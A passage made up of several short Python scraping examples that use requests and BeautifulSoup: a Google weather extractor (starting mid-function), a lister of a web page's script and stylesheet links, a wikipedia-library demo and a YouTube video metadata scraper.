        day_name = day.find("div", attrs={"class": "vk_lgy"}).attrs['aria-label']
        # get weather status for that day
        weather = day.find("img").attrs["alt"]
        temp = day.findAll("span", {"class": "wob_t"})
        # maximum temparature in Celsius, use temp[1].text if you want fahrenheit
        max_temp = temp[0].text
        # minimum temparature in Celsius, use temp[3].text if you want fahrenheit
        min_temp = temp[2].text
        next_days.append({"name": day_name, "weather": weather, "max_temp": max_temp, "min_temp": min_temp})
    # append to result
    result['next_days'] = next_days
    return result
    

if __name__ == "__main__":
    URL = "https://www.google.com/search?lr=lang_en&ie=UTF-8&q=weather"
    import argparse
    parser = argparse.ArgumentParser(description="Quick Script for Extracting Weather data using Google Weather")
    parser.add_argument("region", nargs="?", help="""Region to get weather for, must be available region.
                                        Default is your current location determined by your IP Address""", default="")
    # parse arguments
    args = parser.parse_args()
    region = args.region
    URL += region
    # get data
    data = get_weather_data(URL)
    # print data
    print("Weather for:", data["region"])
    print("Now:", data["dayhour"])
    print(f"Temperature now: {data['temp_now']}C")
    print("Description:", data['weather_now'])
    print("Precipitation:", data["precipitation"])
    print("Humidity:", data["humidity"])
    print("Wind:", data["wind"])
    print("Next days:")
    for dayweather in data["next_days"]:
        print("="*40, dayweather["name"], "="*40)
        print("Description:", dayweather["weather"])
        print(f"Max temperature: {dayweather['max_temp']}C")
        print(f"Min temperature: {dayweather['min_temp']}C")




import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin

import sys

# URL of the web page you want to extract
url = sys.argv[1]

# initialize a session
session = requests.Session()
# set the User-agent as a regular browser
session.headers["User-Agent"] = "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"

# get the HTML content
html = session.get(url).content

# parse HTML using beautiful soup
soup = bs(html, "html.parser")

# get the JavaScript files
script_files = []

for script in soup.find_all("script"):
    if script.attrs.get("src"):
        # if the tag has the attribute 'src'
        script_url = urljoin(url, script.attrs.get("src"))
        script_files.append(script_url)

# get the CSS files
css_files = []

for css in soup.find_all("link"):
    if css.attrs.get("href"):
        # if the link tag has the 'href' attribute
        css_url = urljoin(url, css.attrs.get("href"))
        css_files.append(css_url)


print("Total script files in the page:", len(script_files))
print("Total CSS files in the page:", len(css_files))

# write file links into files
with open("javascript_files.txt", "w") as f:
    for js_file in script_files:
        print(js_file, file=f)

with open("css_files.txt", "w") as f:
    for css_file in css_files:
        print(css_file, file=f)




import wikipedia

# print the summary of what python is
print(wikipedia.summary("Python Programming Language"))

# search for a term
result = wikipedia.search("Neural networks")
print("Result search of 'Neural networks':", result)

# get the page: Neural network
page = wikipedia.page(result[0])

# get the title of the page
title = page.title

# get the categories of the page
categories = page.categories

# get the whole wikipedia page text (content)
content = page.content

# get all the links in the page
links = page.links

# get the page references
references = page.references

# summary
summary = page.summary

# print info
print("Page content:\n", content, "\n")
print("Page title:", title, "\n")
print("Categories:", categories, "\n")
print("Links:", links, "\n")
print("References:", references, "\n")
print("Summary:", summary, "\n")




import requests
from bs4 import BeautifulSoup as bs


def get_video_info(url):
    # download HTML code
    content = requests.get(url)
    # create beautiful soup object to parse HTML
    soup = bs(content.content, "html.parser")
    # initialize the result
    result = {}
    # video title
    result['title'] = soup.find("span", attrs={"class": "watch-title"}).text.strip()
    # video views (converted to integer)
    result['views'] = int(soup.find("div", attrs={"class": "watch-view-count"}).text[:-6].replace(",", ""))
    # video description
    result['description'] = soup.find("p", attrs={"id": "eow-description"}).text
    # date published
    result['date_published'] = soup.find("strong", attrs={"class": "watch-time-text"}).text
    # number of likes as integer
    result['likes'] = int(soup.find("button", attrs={"title": "I like this"}).text.replace(",", ""))
    # number of dislikes as integer
    result['dislikes'] = int(soup.find("button", attrs={"title": "I dislike this"}).text.replace(",", ""))
    # channel details
    channel_tag = soup.find("div", attrs={"class": "yt-user-info"}).find("a")
    # channel name
    channel_name = channel_tag.text
    # channel URL
    channel_url = f"https://www.youtube.com{channel_tag['href']}"
    # number of subscribers as str
    channel_subscribers = soup.find("span", attrs={"class": "yt-subscriber-count"}).text.strip()
    result['channel'] = {'name': channel_name, 'url': channel_url, 'subscribers': channel_subscribers}
    return result

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="YouTube Video Data Extractor")
    parser.add_argument("url", help="URL of the YouTube video")

    args = parser.parse_args()
    # parse the video URL from command line
    url = args.url
    
    data = get_video_info(url)

    # print in nice format
    print(f"Title: {data['title']}")
    print(f"Views: {data['views']}")
    print(f"\nDescription: {data['description']}\n")
    print(data['date_published'])
    print(f"Likes: {data['likes']}")
    print(f"Dislikes: {data['dislikes']}")
    print(f"\nChannel Name: {data['channel']['name']}")
    print(f"Channel URL: {data['channel']['url']}")
    print(f"Channel Subscribers: {data['channel']['subscribers']}")